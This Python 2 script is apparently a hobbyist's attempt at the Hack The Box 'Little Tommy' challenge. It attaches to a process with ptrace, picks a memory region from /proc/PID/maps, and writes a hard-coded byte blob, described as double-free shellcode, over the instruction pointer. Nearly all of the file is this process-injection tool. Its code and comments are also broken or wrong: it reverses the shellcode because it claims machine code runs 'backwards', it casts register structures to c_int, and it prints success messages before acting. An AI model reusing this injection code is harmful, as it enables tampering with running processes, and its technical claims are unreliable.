import ptrace.debugger, os, sys, operator, subprocess
from termcolor import colored
from ctypes import *
# Lister Unlimited Cybersecurity Solutions, LLC.
# This is my attempt to win the hackthebox.eu challenge "Little Tommy" by attempting a double free vulnerability using process injection via Python, and C

# registers need to be in the STRUCT type format to be able to read from the registers
# the way it works is this...

# user_regs_struct --extends--> to both the regs and oldregs subclasses
# the original C function for ptrace reads directly into a C struct file structure for extracting the registers
class user_regs_struct(Structure):
    def __init__(self, rip, rax, rdi, rsi, rbx, rcx, rdx, r8, r9, r10, r11, r12, rbp, rsp):
        # individual registers for a x64 CPU
        self.rip = rip
        self.rax = rax
        self.rdi = rdi
        self.rsi = rsi
        self.rbx = rbx
        self.rcx = rcx
        self.rdx = rdx
        self.r8 = r8
        self.r9 = r9
        self.r10 = r10
        self.r11 = r11
        self.r12 = r12
        self.rbp = rbp
        self.rsp = rsp

class regs(user_regs_struct):
    def __init__(self, rip, rax, rdi, rsi, rbx, rcx, rdx, r8, r9, r10, r11, r12, rbp, rsp):
        # individual registers for a x64 CPU
        self.rip = rip
        self.rax = rax
        self.rdi = rdi
        self.rsi = rsi
        self.rbx = rbx
        self.rcx = rcx
        self.rdx = rdx
        self.r8 = r8
        self.r9 = r9
        self.r10 = r10
        self.r11 = r11
        self.r12 = r12
        self.rbp = rbp
        self.rsp = rsp

class oldregs(user_regs_struct):
    def __init__(self, rip, rax, rdi, rsi, rbx, rcx, rdx, r8, r9, r10, r11, r12, rbp, rsp):
        # individual registers for a x64 CPU
        self.rip = rip
        self.rax = rax
        self.rdi = rdi
        self.rsi = rsi
        self.rbx = rbx
        self.rcx = rcx
        self.rdx = rdx
        self.r8 = r8
        self.r9 = r9
        self.r10 = r10
        self.r11 = r11
        self.r12 = r12
        self.rbp = rbp
        self.rsp = rsp

# Just colored text to make it more readable
def red(string):
    string = colored(string,'red',attrs=['bold'])

    return string
def green(string):
    string = colored(string,'green',attrs=['bold'])

    return string
def yellow(string):
    string = colored(string,'yellow',attrs=['bold'])

    return string
def cyan(string):
    string = colored(string,'cyan',attrs=['bold'])

    return string

# critical ptrace functions. Note that ptrace for Python is buggy and barely clarified, see ptrace_attach below. It's advisable you should just mess around with the C language version
# or implement ctypes/cython and compile a shared object file to use
def ptrace_attach(pid):
    debugger = ptrace.debugger

    # documentation never officially mentioned that there are four mandatory arguments that you need to fill out
    tracedproc = ptrace.debugger.PtraceProcess(debugger, pid, is_attached=False, parent=None, is_thread=False)
    return tracedproc
def ptrace_getregs(tracedproc):
    regs = tracedproc.getregs()
    return regs
def ptrace_readregs(tracedproc):
    # gets either the EIP (x86) or RIP (x64) instruction pointer depending on your PC type
    rip = tracedproc.getInstrPointer()
    return rip
def ptrace_readbytes(tracedproc,regs,amtBytes):
    # bytes = tracedproc.readBytes(regs.ax,amtBytes)
    bytes = tracedproc.readBytes(regs,amtBytes)
    return bytes
def ptrace_inject(shellcode,tracedproc,rip):
    bytes = tracedproc.writeBytes(rip,shellcode)
    return bytes
def ptrace_cont(tracedproc):
    tracedproc.cont()
    return
def ptrace_detach(tracedproc):
    # this function appears to crash regularly
    tracedproc.detach()
    return
def Reverse(str):
    # all this does is reverse the string because Assembly language must be inserted and read BACKWARDS
    # that means all Assembly-based shellcode must be read BACKWARDS to the CPU
    reversed = str[::-1]
    return reversed

def returnInjectable(pid):
    # returns a user-selectable list of INJECTABLE memory address ranges complete with information on...
    # 1. execution policy
    # 2. Any labels like "heap" and "stack" if possible
    # 3. Calculated differences between starting and ending addresses
    # 4. Calculated required size of buffer to inject
    cmd = "cat /proc/{}/maps | grep 00:00".format(str(pid))
    p = subprocess.Popen(cmd,shell=True,executable="/bin/bash",stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    l = p.stdout.read()
    l = str(l.encode('utf-8'))
    print l
    l = l.splitlines()
    i = 0
    stack = {}
    for line in l:
        s = str(line)
        s = s.split('-')
        s = str(s)

        s = s.split(' ')
        i2 = 0
        # print "split line is ",str(s)
        arrayMemAddr = []
        # convert to hex by adding 0x and doing int(hexidecimal,0)
        startAddr = int("0x"+s[0].replace("[","").replace("'","").replace(",",""),0)
        endAddr = int("0x"+s[1].replace("[","").replace("'","").replace(",",""),0)
        bufferSpace = hex(endAddr - startAddr)
        arrayMemAddr.append(int(bufferSpace,0))
        for line2 in s:
            arrayMemAddr.append(s[i2])
            stack[i] = arrayMemAddr
            # print "Added entry ", str(i), "Subcategory ", str(i2), "To stack"
            i2 += 1
        i += 1

    return stack

def ptrace_setregisters(tracedproc,regs,pid):
    tracedproc.setregs(regs)
    return
def main():
    # usage

    if len(sys.argv) != 2:
        print "USAGE:\r\npythonapp.py pid"
        exit(0)

    # converts shellcode to LIFO standard reversed assembly opcodes
    buffer = "\x48\x83\xec\x08\x48\x8b\x05\xdd\x2f\x48\x85\xc0\x74\x02\xff\xd0\x48\x83\xc4\x08\xc3\xff\x35\xe2\x2f\xff\x25\xe4\x2f\x0f\x1f\x40\xff\x25\xe2\x2f\x68\xe9\xe0\xff\xff\xff\xff\x25\xda\x2f\x68\x01\xe9\xd0\xff\xff\xff\xff\x25\xd2\x2f\x68\x02\xe9\xc0\xff\xff\xff\xff\x25\x92\x2f\x66\x90\x31\xed\x49\x89\xd1\x5e\x48\x89\xe2\x48\x83\xe4\xf0\x50\x54\x4c\x8d\x05\xfa\x02\x48\x8d\x0d\x83\x02\x48\x8d\x3d\x0e\x02\xff\x15\x46\x2f\xf4\x0f\x1f\x44\x48\x8d\x3d\x89\x32\x48\x8d\x05\x82\x32\x48\x39\xf8\x74\x15\x48\x8b\x05\x1e\x2f\x48\x85\xc0\x74\x09\xff\xe0\x0f\x1f\x80\xc3\x0f\x1f\x80\x48\x8d\x3d\x59\x32\x48\x8d\x35\x52\x32\x48\x29\xfe\x48\xc1\xfe\x03\x48\x89\xf0\x48\xc1\xe8\x3f\x48\x01\xc6\x48\xd1\xfe\x74\x14\x48\x8b\x05\xf5\x2e\x48\x85\xc0\x74\x08\xff\xe0\x66\x0f\x1f\x44\xc3\x0f\x1f\x80\x80\x3d\x19\x32\x75\x2f\x55\x48\x83\x3d\xd6\x2e\x48\x89\xe5\x74\x0c\x48\x8b\x3d\x1a\x2f\xe8\x2d\xff\xff\xff\xe8\x68\xff\xff\xff\xc6\x05\xf1\x31\x01\x5d\xc3\x0f\x1f\x80\xc3\x0f\x1f\x80\xe9\x7b\xff\xff\xff\x55\x48\x89\xe5\x48\x83\xec\x40\x48\x89\x7d\xc8\x48\x8d\x35\x60\x12\x48\x8d\x3d\x09\x12\xb8\xe8\xc7\xfe\xff\xff\x48\x8b\x45\xc8\x48\x89\x45\xf0\x48\x8b\x45\xf0\x48\x89\xc6\x48\x8d\x3d\xff\x11\xb8\xe8\xa7\xfe\xff\xff\xbf\x08\xe8\xad\xfe\xff\xff\x48\x89\x45\xe8\x48\x8d\x45\xf0\x48\x89\xc6\x48\x8d\x3d\xe7\x11\xb8\xe8\x81\xfe\xff\xff\x48\x8d\x45\xe8\x48\x89\xc6\x48\x8d\x3d\xcf\x11\xb8\xe8\x69\xfe\xff\xff\xbf\x0f\xe8\x6f\xfe\xff\xff\x48\x89\x45\xf8\x48\x8b\x45\xf8\x48\xb9\x74\x65\x73\x74\x20\x73\x74\x72\x48\x89\x08\xc7\x40\x08\x69\x6e\x67\x48\x8b\x45\xf0\x48\x89\xc7\xe8\x27\xfe\xff\xff\x48\x8b\x45\xe8\x48\x89\xc7\xe8\x1b\xfe\xff\xff\x48\x8b\x45\xf0\x48\x89\xc7\xe8\x0f\xfe\xff\xff\xbf\x08\xe8\x25\xfe\xff\xff\x48\x89\x45\xe0\xbf\x08\xe8\x17\xfe\xff\xff\x48\x89\x45\xd8\xbf\x08\xe8\x09\xfe\xff\xff\x48\x89\x45\xd0\x48\x8b\x55\xe0\x48\x8d\x45\xe0\x48\x89\xc6\x48\x8d\x3d\x4b\x11\xb8\xe8\xd9\xfd\xff\xff\x48\x8b\x55\xd8\x48\x8d\x45\xd8\x48\x89\xc6\x48\x8d\x3d\x2f\x11\xb8\xe8\xbd\xfd\xff\xff\x48\x8b\x55\xd0\x48\x8d\x45\xd0\x48\x89\xc6\x48\x8d\x3d\x13\x11\xb8\xe8\xa1\xfd\xff\xff\x90\xc9\xc3\x55\x48\x89\xe5\x48\x83\xec\x10\xc7\x05\x80\x30\xeb\x3a\x8b\x05\x78\x30\x48\x98\x48\x8d\x14\xc5\x48\x8d\x05\x93\x2d\x48\x8b\x04\x02\x48\x89\x45\xf8\x48\x8b\x45\xf8\x48\x89\xc7\xe8\x74\xfe\xff\xff\x8b\x05\x4d\x30\x83\xc0\x01\x89\x05\x44\x30\x8b\x05\x3e\x30\x3d\xce\x02\x76\xb9\xb8\xc9\xc3\x66\x2e\x0f\x1f\x84\x66\x90\x41\x57\x41\x56\x49\x89\xd7\x41\x55\x41\x54\x4c\x8d\x25\xc6\x2a\x55\x48\x8d\x2d\xc6\x2a\x53\x41\x89\xfd\x49\x89\xf6\x4c\x29\xe5\x48\x83\xec\x08\x48\xc1\xfd\x03\xe8\xbf\xfc\xff\xff\x48\x85\xed\x74\x20\x31\xdb\x0f\x1f\x84\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xdd\x75\xea\x48\x83\xc4\x08\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3\x66\x66\x2e\x0f\x1f\x84\xf3\xc3\x48\x83\xec\x08\x48\x83\xc4\x08\xc3"
    # instructions in shellcode...
    # 1. It contains a wordlist of memory address to double free
    # 2. Applies the double free vulnerability to each memory address
    # 3. Since the freed memory still has the old pointers pointing to it, we print the contents to
    
    buffer = buffer.strip().rstrip()
    shellcode = Reverse(buffer)
    print "Reversed shellcode is \r\n{}\n\n\n".format(
            str(shellcode)
    )

    # reads the pid memory map and calculates appropriate buffersize to present to user
    pid = sys.argv[1]
    targetRanges = returnInjectable(pid)
    t = 0
    for t in targetRanges:
        print "\n#{}\t Target BUFFERSIZE {}, Shellcode BUFFERSIZE {}, STARTADDR {}, ENDADDR {}:\r\nOTHER ATTRIBUTES\t{}".format(
            cyan(str(t)),
            yellow(str(targetRanges[t][0])),
            red(str(sys.getsizeof(shellcode))),
            str(targetRanges[t][1]),
            str(targetRanges[t][2]),
            str(targetRanges[t][3:])
        )
        t += 1

    print green("SELECT a targetable buffer")
    tgtAddr = int(raw_input("Enter target buffer to inject to: "))
    tgtAddr = targetRanges[tgtAddr]
    pid = int(pid)
    # creates a traced process instance object
    tracedproc = ptrace_attach(pid)
    print "Successfully injected into process"
    # reads and backs up EIP/RIP register
    regs = ptrace_getregs(tracedproc)
    print "Obtained Instruction Pointer Registers\r\n{}".format(str(regs))
    rip = ptrace_readregs(tracedproc)
    oldregs = ptrace_readbytes(tracedproc,rip,sys.getsizeof(rip))
    print "Backed up instructions of RIP\r\n{}".format(
        str(oldregs)
    )

    # typecast to C-Types, or else it cannot use the ctypes.addressof function

    regs = c_int(regs)
    oldregs = c_int(oldregs)

    # injects shellcode and restarts process and detaches from it
    ptrace_inject(shellcode,tracedproc,rip)
    print "Shellcode injected into RIP register"

    # resets the registers to the memory address of
    ptrace_setregisters(tracedproc, regs, pid)
    print "Register reset to {}".format(str(regs))
    ptrace_cont(tracedproc)
    print "Restarting process"
    ptrace_setregisters(tracedproc, oldregs, pid)
    print "Register reset to {}".format(str(oldregs))
    ptrace_cont(tracedproc)
    print "Restarting process"
    ptrace_detach(tracedproc)
    print "Detaching from process"
    return
main()
